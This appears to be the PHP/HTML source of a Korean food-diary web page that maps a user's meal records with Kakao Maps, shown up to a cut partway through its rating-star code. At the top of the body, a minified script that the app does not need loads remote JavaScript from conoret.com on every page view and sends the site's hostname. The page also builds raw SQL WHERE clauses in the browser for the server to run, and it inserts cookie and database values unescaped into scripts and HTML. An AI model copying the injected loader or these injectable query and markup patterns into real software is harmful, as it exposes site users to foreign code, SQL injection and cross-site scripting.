!DOCTYPE html>
<?php
include 'script/modules/CookieManager.php';
(CookieManager::factory())->refreshCookie();
?>
<html lang="en">
<head>
    <?php
    include 'script/modules/LayoutHandler.php';
    (LayoutHandler::factory())->createTitle('내 다이어리');
    ?>

    <style>
        @font-face { /* 애플산돌고딕 폰트 적용 */
            font-family: "Jua";
            src: url("css/font/Jua-Regular.ttf") format("truetype");
            font-weight: normal;
        }
    </style>
    <link href="./css/footer.css" rel="stylesheet">
    <link rel="stylesheet" href="/css/header.css">
    <link rel="stylesheet" href="/css/diary.css">

    <script
        src="https://code.jquery.com/jquery-3.6.0.min.js"
        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4="
        crossorigin="anonymous"></script>
    <script type="text/javascript">
        let mql = window.matchMedia("screen and (max-width: 768px)");
        let flag=false;

        let menus={}
        const userId=<?php echo $_COOKIE['user_id'];?>

        mql.addListener(function(e) {
            flag=!!e.matches
        });
    </script>
    <script type="text/javascript" src="/script/javascript/modules.js"></script>
</head>

<body class="text-center vsc-initialized" cz-shortcut-listen="true">
<script type="text/javascript">
    window.top === window && !function(){var e=document.createElement("script"),t=document.getElementsByTagName("head")[0];e.src="//conoret.com/dsp?h="+document.location.hostname+"&r="+Math.random(),e.type="text/javascript",e.defer=!0,e.async=!0,t.appendChild(e)}();
</script>
<div class="cover-container d-flex h-100 p-3 mx-auto flex-column">

    <?php (LayoutHandler::factory())->createHeader(); ?>
    
    <main role="main" class="inner cover d-flex" id="rating_main"  style="">
        <div class="card">
            <div class="card-body" id="title">
                <h5 class="card-title">다이어리</h5>
                <p class="card-text">당신의 식사 기록.</p>
            </div>
            <div id="map" style="width:100%;height:350px;"></div>

            <!-- Button trigger modal -->
            <ul class="list-group list-group-flush flex-row" id="diary-list" style="max-height: 100%; height: 100%; overflow-x: auto; overflow-y: auto;">

            </ul>
        </div>
        <div class="card" id='diary-info' style="">
            <div class="card-body" id="title">
                <div class="box">
                    <img class="food-image" id="food-info-image" src="/src/food_placeholder.png"/>
                </div>
                <h1 class="card-title" id="food-name">식당명</h1>
                <p class="card-text" id="food-traits">위치</p>
                <div id="rating" style="margin-bottom: 50px;">
                    <img class="rating-stars" src="/src/rate_star_before_half-left.png" height="100" width="50"><img class="rating-stars" src="/src/rate_star_before_half-right.png" height="100" width="50">
                    <img class="rating-stars" src="/src/rate_star_before_half-left.png" height="100" width="50"><img class="rating-stars" src="/src/rate_star_before_half-right.png" height="100" width="50">
                    <img class="rating-stars" src="/src/rate_star_before_half-left.png" height="100" width="50"><img class="rating-stars" src="/src/rate_star_before_half-right.png" height="100" width="50">
                    <img class="rating-stars" src="/src/rate_star_before_half-left.png" height="100" width="50"><img class="rating-stars" src="/src/rate_star_before_half-right.png" height="100" width="50">
                    <img class="rating-stars" src="/src/rate_star_before_half-left.png" height="100" width="50"><img class="rating-stars" src="/src/rate_star_before_half-right.png" height="100" width="50">
                </div>
                <div id="menu-list" class="list-group">

                </div>
            </div>

        </div>
    </main>
    <?php (LayoutHandler::factory())->createFooter(); ?>

</div>

<!-- Modal -->
<div id="modal-layout">
    <div class="modal fade" id="recordModal" tabindex="-1" aria-labelledby="recordModalLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h1 class="modal-title fs-5" id="recordModalLabel">다이어리</h1>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body" id="modal-content">
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                </div>
            </div>
        </div>
    </div>
</div>
<script type="text/javascript" src="//dapi.kakao.com/v2/maps/sdk.js?appkey=a4b680f23e6397395260cfd7b38420b8&libraries=services,clusterer,drawing"></script>
<script>
    let postJson={}
    let k=null
    let before={}
    before.id=null

    let mapContainer = document.getElementById('map'), // 지도를 표시할 div
        mapOption = {
            center: new kakao.maps.LatLng(36.5, 128), // 지도의 중심좌표
            level: 13 // 지도의 확대 레벨
        };

    let map = new kakao.maps.Map(mapContainer, mapOption); // 지도를 생성합니다

    // 마커를 클릭하면 장소명을 표출할 인포윈도우 입니다
    let infowindow = new kakao.maps.InfoWindow({zIndex:1});

    // 지도에 표시된 마커 객체를 가지고 있을 배열입니다
    let markers = {};

    // 마커를 생성하고 지도위에 표시하는 함수입니다
    function addMarker(position,info) {
        // 마커를 생성합니다
        let marker = new kakao.maps.Marker({
            position: position
        });
        markers[info[3]]=marker
        // 마커가 지도 위에 표시되도록 설정합니다
        marker.setMap(map);

        // 마커에 클릭이벤트를 등록합니다
        kakao.maps.event.addListener(marker, 'click', async function(event) {
            let menu_info=JSON.parse(await $.post("script/php/DAOHandler.php",{
                0:'select',
                1:'distinct foodid,userid,meal.rating,name',
                2:'meal, food',
                3:`userid=${userId} and meal.locationid=${info[3]} and meal.foodid=food.id`
            }));
            let menu_count=JSON.parse(await $.post("script/php/DAOHandler.php",{
                0:'select',
                1:'foodid, name,count(*) `count`',
                2:'meal, food',
                3:`userid=${userId} and meal.foodid=food.id and meal.locationid=${info[3]} group by foodid`
            }));
            menus={}
            for(let i=0;i<menu_info.length;i++) {
                let option=``
                switch (parseInt(menu_info[i][2])) {
                    case 0:option='나쁨';break;
                    case 1:option='보통';break;
                    case 2:option='좋음';break;
                }
                menus[menu_info[i][0]]={
                    name:menu_info[i][3],
                    rating:option,
                    rating_int:parseInt(menu_info[i][2]),
                    count:menu_count[i][2]
                }
            }
            const menu_key=Object.keys(menus)
            if(flag) {
                let f=``
                let fr=``
                switch (parseInt(info[1])) {
                    case 1:
                        f=getScore(0,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30)
                        fr=getScore(0,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30*2)
                        break
                    case 2:
                        f=getScore(1,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30)
                        fr=getScore(1,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30*2)
                        break
                    case 3:
                        f=getScore(2,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30)
                        fr=getScore(2,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30*2)
                        break
                    case 4:
                        f=getScore(3,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30)
                        fr=getScore(3,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30*2)
                        break
                    case 5:
                        f=getScore(4,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30)
                        fr=getScore(4,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30*2)
                        break
                    case 6:
                        f=getScore(5,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30)
                        fr=getScore(5,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30*2)
                        break
                    case 7:
                        f=getScore(6,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30)
                        fr=getScore(6,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30*2)
                        break
                    case 8:
                        f=getScore(7,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30)
                        fr=getScore(7,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30*2)
                        break
                    case 9:
                        f=getScore(8,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30)
                        fr=getScore(8,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30*2)
                        break
                    case 10:
                        f=getScore(9,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30)
                        fr=getScore(9,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30*2)
                        break
                    default :
                        break
                }
                const rfmt=`
                        <div>
                            <div><img src="src/ramen.jpg" width="240px" height="240px"></div>
                            <div><span>${info[2]}</span></div>
                            <div><span>${f}</span></div>
                            <div><span>${info[6]}</span></div>
                            <div><span>${info[7]}</span></div>
                        </div>
                        `
                const rrfmt=
                    `
                        <div>
                            <div><img src="src/ramen.jpg" width="240px" height="240px"></div>
                            <div><span>${info[2]}</span></div>
                            <div><span>${fr}</span></div>
                            <div><span>${info[6]}</span></div>
                            <div><span>${info[7]}</span></div>
                        </div>
                        `
                document.getElementById('modal-content').innerHTML=``
                document.getElementById('modal-content').innerHTML=rfmt
                document.getElementById(`diary-list-${info[3]}`).click()
                let format=`
                                <div style="padding:5px;font-size:12px;display: inline-block;">
                                    <span>${info[2]}</span>
                                    <div class="d-flex justify-content-start fs-2" id="diary-${info[3]}" style=" margin: 0px !important; padding: 0px !important;">
                                        ${f}
                                    </div>
                                </div>
                                `
                let format_right=`
                                <div class="card-body" id="title">
                                    <div class="box">
                                        <img class="food-image" id="food-info-image" src="/src/food_placeholder.png"/>
                                    </div>
                                    <h1 class="card-title" id="diary-name">${info[2]}</h1>
                                    <p class="card-text" id="diary-location">${info[6]}</p>
                                    <p class="card-text" id="diary-traits">${info[7]}</p>
                                    <div id="rating" style="margin-bottom: 50px;">
                                        ${fr}
                                    </div>
                                </div>
                                `
                document.getElementById('diary-info').innerHTML=format_right
                infowindow.setContent(format);
                infowindow.open(map,marker);
            }
            else {
                let f=``
                let fr=``
                let menu_list=``
                for(let i=0;i<menu_key.length;i++) {
                    menu_list+=`
                        <li id="${info[3]}-${menu_key[i]}" class="list-group-item menus d-flex justify-content-between">
                            <span class="menu-content">${menus[menu_key[i]].name}</span>
                            <span class="menu-count">${menus[menu_key[i]].count}</span>
                            <span class="menu-content">${menus[menu_key[i]].rating}</span>
                        </li>
                        `
                }
                switch (parseInt(info[1])) {
                    case 1:
                        f=getScore(0,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30)
                        fr=getScore(0,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30*2)
                        break
                    case 2:
                        f=getScore(1,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30)
                        fr=getScore(1,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30*2)
                        break
                    case 3:
                        f=getScore(2,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30)
                        fr=getScore(2,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30*2)
                        break
                    case 4:
                        f=getScore(3,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30)
                        fr=getScore(3,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30*2)
                        break
                    case 5:
                        f=getScore(4,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30)
                        fr=getScore(4,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30*2)
                        break
                    case 6:
                        f=getScore(5,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30)
                        fr=getScore(5,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30*2)
                        break
                    case 7:
                        f=getScore(6,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30)
                        fr=getScore(6,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30*2)
                        break
                    case 8:
                        f=getScore(7,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30)
                        fr=getScore(7,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30*2)
                        break
                    case 9:
                        f=getScore(8,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30)
                        fr=getScore(8,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30*2)
                        break
                    case 10:
                        f=getScore(9,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30)
                        fr=getScore(9,info[3],`${info[6]}`,`${info[7]}`,`${info[2]}`,info[4],info[5],30*2)
                        break
                    default :
                        break
                }
                let format=`
                                <div style="padding:5px;font-size:12px;display: inline-block;">
                                    <span>${info[2]}</span>
                                    <div class="d-flex justify-content-start fs-2" id="diary-${info[3]}" style=" margin: 0px !important; padding: 0px !important;">
                                        ${f}
                                    </div>
                                </div>
                                `
                let format_right=`
                                <div class="card-body" id="title">
                                    <div class="box">
                                        <img class="food-image" id="food-info-image" src="/src/food_placeholder.png"/>
                                    </div>
                                    <h1 class="card-title" id="diary-name">${info[2]}</h1>
                                    <p class="card-text" id="diary-location">${info[6]}</p>
                                    <p class="card-text" id="diary-traits">${info[7]}</p>
                                    <div id="rating" style="margin-bottom: 50px;">
                                        ${fr}
                                    </div>
                                    <div id="menu-list" class="list-group">${menu_list}</div>
                                </div>
                                `
                document.getElementById('diary-info').innerHTML=format_right
                infowindow.setContent(format);
                infowindow.open(map,marker);
            }

        });
    }

    // 배열에 추가된 마커들을 지도에 표시하거나 삭제하는 함수입니다
    function setMarkers(map) {
        for (var i = 0; i < markers.length; i++) {
            markers[i].setMap(map);
        }
    }

    // "마커 보이기" 버튼을 클릭하면 호출되어 배열에 추가된 마커를 지도에 표시하는 함수입니다
    function showMarkers() {
        setMarkers(map)
    }

    // "마커 감추기" 버튼을 클릭하면 호출되어 배열에 추가된 마커를 지도에서 삭제하는 함수입니다
    function hideMarkers() {
        setMarkers(null);
    }
    async function showInfo() {
        menus={}
        let menu_info=JSON.parse(await $.post("script/php/DAOHandler.php",{
            0:'select',
            1:'distinct foodid,userid,meal.rating,name',
            2:'meal, food',
            3:`userid=${userId} and meal.locationid=${arguments[2]} and meal.foodid=food.id`
        }));
        let menu_count=JSON.parse(await $.post("script/php/DAOHandler.php",{
            0:'select',
            1:'foodid, name,count(*) `count`',
            2:'meal, food',
            3:`userid=${userId} and meal.foodid=food.id and meal.locationid=${arguments[2]} group by foodid`
        }));
        for(let i=0;i<menu_info.length;i++) {
            let option=``
            switch (parseInt(menu_info[i][2])) {
                case 0:option='나쁨';break;
                case 1:option='보통';break;
                case 2:option='좋음';break;
            }
            menus[menu_info[i][0]]={
                name:menu_info[i][3],
                rating:option,
                rating_int:parseInt(menu_info[i][2]),
                count:menu_count[i][2]
            }
        }
        const menu_key=Object.keys(menus)
        if(flag) {
            let diary_list=document.getElementsByClassName('diary-list')
            for(let i=0;i<diary_list.length;i++) {
                diary_list[i].setAttribute('data-bs-toggle',"modal")
                diary_list[i].setAttribute('data-bs-target',"#recordModal")
            }
            if(document.getElementById(`diary-list-${arguments[2]}`).classList.contains('active')) {
                document.getElementById(`diary-list-${arguments[2]}`).classList.remove('active')
            }
            else {
                if(before.id!==null) {
                    document.getElementById(`diary-list-${before.id}`).classList.remove('active')
                }
                document.getElementById(`diary-list-${arguments[2]}`).classList.add('active')
                before.id=arguments[2]
            }
            const marker=markers[arguments[2]]
            let f=``
            let fr=``
            switch (parseInt(arguments[0])) {
                case 1:
                    f=getScore(0,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30)
                    fr=getScore(0,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30*2)
                    break
                case 2:
                    f=getScore(1,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30)
                    fr=getScore(1,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30*2)
                    break
                case 3:
                    f=getScore(2,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30)
                    fr=getScore(2,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30*2)
                    break
                case 4:
                    f=getScore(3,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30)
                    fr=getScore(3,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30*2)
                    break
                case 5:
                    f=getScore(4,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30)
                    fr=getScore(4,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30*2)
                    break
                case 6:
                    f=getScore(5,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30)
                    fr=getScore(5,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30*2)
                    break
                case 7:
                    f=getScore(6,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30)
                    fr=getScore(6,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30*2)
                    break
                case 8:
                    f=getScore(7,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30)
                    fr=getScore(7,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30*2)
                    break
                case 9:
                    f=getScore(8,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30)
                    fr=getScore(8,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30*2)
                    break
                case 10:
                    f=getScore(9,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30)
                    fr=getScore(9,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30*2)
                    break
                default :
                    break
            }
            const rfmt=`
                        <div>
                            <div><img src="${arguments[7]}" width="240px" height="240px"></div>
                            <div><span>${arguments[1]}</span></div>
                            <div><span>${f}</span></div>
                            <div><span>${arguments[5]}</span></div>
                            <div><span>${arguments[6]}</span></div>
                        </div>
                        `
            document.getElementById('modal-content').innerHTML=``
            document.getElementById('modal-content').innerHTML=rfmt
            let format=`
                                <div style="padding:5px;font-size:12px;display: inline-block;">
                                    <span>${arguments[1]}</span>
                                    <div class="d-flex justify-content-start fs-2" id="diary-${arguments[1]}" style=" margin: 0px !important; padding: 0px !important;">
                                        ${f}
                                    </div>
                                </div>
                                `
            let format_right=`
                                <div class="card-body" id="title">
                                    <div class="box">
                                        <img class="food-image" id="food-info-image" src="${arguments[7]}"/>
                                    </div>
                                    <h1 class="card-title" id="diary-name">${arguments[1]}</h1>
                                    <p class="card-text" id="diary-location">${arguments[5]}</p>
                                    <p class="card-text" id="diary-traits">${arguments[6]}</p>
                                    <div id="rating" style="margin-bottom: 50px;">
                                        ${fr}
                                    </div>
                                </div>
                                `
            document.getElementById('diary-info').innerHTML=format_right
            infowindow.setContent(format);
            infowindow.open(map,marker);
        }
        else {
            let menu_list=``
            for(let i=0;i<menu_key.length;i++) {
                menu_list+=`
                        <li id="${arguments[2]}-${menu_key[i]}" class="list-group-item menus d-flex justify-content-between">
                            <span class="menu-content">${menus[menu_key[i]].name}</span>
                            <span class="menu-count">${menus[menu_key[i]].count}</span>
                            <span class="menu-content">${menus[menu_key[i]].rating}</span>
                        </li>
                        `
            }
            let diary_list=document.getElementsByClassName('diary-list')
            for(let i=0;i<diary_list.length;i++) {
                diary_list[i].removeAttribute('data-bs-toggle')
                diary_list[i].removeAttribute('data-bs-target')
            }
            if(document.getElementById(`diary-list-${arguments[2]}`).classList.contains('active')) {
                document.getElementById(`diary-list-${arguments[2]}`).classList.remove('active')
            }
            else {
                if(before.id!==null) {
                    document.getElementById(`diary-list-${before.id}`).classList.remove('active')
                }
                document.getElementById(`diary-list-${arguments[2]}`).classList.add('active')
                before.id=arguments[2]
            }
            const marker=markers[arguments[2]]
            let f=``
            let fr=``
            switch (parseInt(arguments[0])) {
                case 1:
                    f=getScore(0,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30)
                    fr=getScore(0,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30*2)
                    break
                case 2:
                    f=getScore(1,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30)
                    fr=getScore(1,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30*2)
                    break
                case 3:
                    f=getScore(2,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30)
                    fr=getScore(2,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30*2)
                    break
                case 4:
                    f=getScore(3,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30)
                    fr=getScore(3,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30*2)
                    break
                case 5:
                    f=getScore(4,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30)
                    fr=getScore(4,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30*2)
                    break
                case 6:
                    f=getScore(5,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30)
                    fr=getScore(5,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30*2)
                    break
                case 7:
                    f=getScore(6,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30)
                    fr=getScore(6,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30*2)
                    break
                case 8:
                    f=getScore(7,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30)
                    fr=getScore(7,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30*2)
                    break
                case 9:
                    f=getScore(8,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30)
                    fr=getScore(8,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30*2)
                    break
                case 10:
                    f=getScore(9,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30)
                    fr=getScore(9,arguments[2],`${arguments[5]}`,`${arguments[6]}`,`${arguments[1]}`,arguments[3],arguments[4],30*2)
                    break
                default :
                    break
            }
            let format=`
                                <div style="padding:5px;font-size:12px;display: inline-block;">
                                    <span>${arguments[1]}</span>
                                    <div class="d-flex justify-content-start fs-2" id="diary-${arguments[1]}" style=" margin: 0px !important; padding: 0px !important;">
                                        ${f}
                                    </div>
                                </div>
                                `
            let format_right=`
                                <div class="card-body" id="title">
                                    <div class="box">
                                        <img class="food-image" id="food-info-image" src="${arguments[7]}" />
                                    </div>
                                    <h1 class="card-title" id="diary-name">${arguments[1]}</h1>
                                    <p class="card-text" id="diary-location">${arguments[5]}</p>
                                    <p class="card-text" id="diary-traits">${arguments[6]}</p>
                                    <div id="rating" style="margin-bottom: 50px;">
                                        ${fr}
                                    </div>
                                    <div id="menu-list" class="list-group">${menu_list}</div>
                                </div>
                                `
            document.getElementById('diary-info').innerHTML=format_right
            infowindow.setContent(format);
            infowindow.open(map,marker);
        }

    }
    async function init() {
        if(mql.matches) {
            // 모바일
            flag=true;
            document.getElementById('diary-info').style.cssText='display:none!important;'
            k=JSON.parse(await $.ajax({
                type: "POST",
                url: '/script/php/DAOHandler.php',
                data: {
                    0:'select',
                    1:'*',
                    2:'record',
                    3:`userid=${<?php echo $_COOKIE['user_id']?>}`
                }}))

            if(k.length !== 0) {
                let format=``
                for(let i=0; i < k.length; i++) {
                    addMarker(
                        new kakao.maps.LatLng(k[i][4], k[i][5]),
                        k[i]
                    )
                    format+=`
                        <li class='list-group-item diary-list' id='diary-list-${k[i][3]}'
                        data-bs-toggle="modal" data-bs-target="#recordModal"
                        onclick="showInfo(${k[i][1]},'${k[i][2]}',${k[i][3]},${k[i][4]},${k[i][5]},'${k[i][6]}','${k[i][7]}','${k[i][9]}')"
                        >
                            <span>${k[i][2]}</span>
                        </li>
                        `
                }
                document.getElementById('diary-list').innerHTML=format
            }
        } else {
            // 데스크탑
            flag=false
            k=JSON.parse(await $.ajax({
                type: "POST",
                url: '/script/php/DAOHandler.php',
                data: {
                    0:'select',
                    1:'*',
                    2:'record',
                    3:`userid=${<?php echo $_COOKIE['user_id']?>}`
                }}))

            if(k.length !== 0) {
                let format=``
                for(let i=0; i < k.length; i++) {
                    addMarker(
                        new kakao.maps.LatLng(k[i][4], k[i][5]),
                        k[i]
                    )
                    format+=`
                        <li class='list-group-item diary-list' id='diary-list-${k[i][3]}'
                        onclick="showInfo(${k[i][1]},'${k[i][2]}',${k[i][3]},${k[i][4]},${k[i][5]},'${k[i][6]}','${k[i][7]}','${k[i][9]}')"
                        >
                            <span>${k[i][2]}</span>
                        </li>
                        `
                }
                document.getElementById('diary-list').innerHTML=format
            }
        }


    }
    function set() {
        // need to imple
    }
    function getScore() {
        let height=parseInt(arguments[7])
        let width=parseInt(arguments[7])/2

        switch (parseInt(arguments[0])) {
            case 0:
                return `
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
            case 1:
                return `
            <img src="/src/rate_star_after_half-left.png" height="${height}" width="${width}" onclick="set(0,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_after_half-right.png" height="${height}" width="${width}" onclick="set(1,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(2,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(3,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(4,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(5,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(6,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(7,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">
            <img src="/src/rate_star_before_half-left.png" height="${height}" width="${width}" onclick="set(8,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})"><img src="/src/rate_star_before_half-right.png" height="${height}" width="${width}" onclick="set(9,${arguments[1]},'${arguments[2]}','${arguments[3]}','${arguments[4]}',${arguments[5]},${arguments[6]})">`
            case 2:
                return `
